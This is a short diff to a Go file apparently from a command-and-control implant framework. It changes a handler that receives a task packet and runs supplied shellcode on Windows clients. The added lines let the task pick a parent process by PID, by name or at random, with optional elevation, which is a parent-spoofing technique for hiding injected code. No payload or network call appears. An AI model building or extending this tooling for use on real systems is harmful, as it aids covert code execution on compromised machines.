@@ -9,10 +9,6 @@ import (
 	"github.com/iDigitalFlame/xmt/data"
 )
 
-// TaskCode is a Task that instructs the Client to run the supplied shellcode and wait for completion if the 'Wait'
-// flag is true.
-const TaskCode simpleTask = 0xB005
-
 // Code is a struct that is similar to the 'cmd.Code' struct. This is used to Task a Client with running shellcode
 // on Windows devices. This struct has many of the functionallies of the standard 'cmd.Program' function. The
 // 'SetParent*' function will attempt to set the target that runs the shellcode. If none are specified, the shellcode
@@ -122,7 +118,7 @@ func (c *Code) UnmarshalStream(r data.Reader) error {
 func (c *Code) SetParentRandomEx(n []string, e bool) {
 	c.name, c.pid, c.choices, c.elevated = "", -1, n, e
 }
-func taskCode(x context.Context, p *com.Packet) (*com.Packet, error) {
+func code(x context.Context, p *com.Packet) (*com.Packet, error) {
 	var c Code
 	if err := c.UnmarshalStream(p); err != nil {
 		return nil, err
@@ -131,6 +127,14 @@ func taskCode(x context.Context, p *com.Packet) (*com.Packet, error) {
 		z   = cmd.NewCodeContext(x, c.Data)
 		err error
 	)
+	switch {
+	case c.pid != 0:
+		z.SetParentPID(c.pid)
+	case len(c.name) > 0:
+		z.SetParentEx(c.name, c.elevated)
+	case len(c.choices) > 0:
+		z.SetParentRandomEx(c.choices, c.elevated)
+	}
 	z.Timeout = c.Timeout
 	if err = z.Start(); err != nil {
 		return nil, err
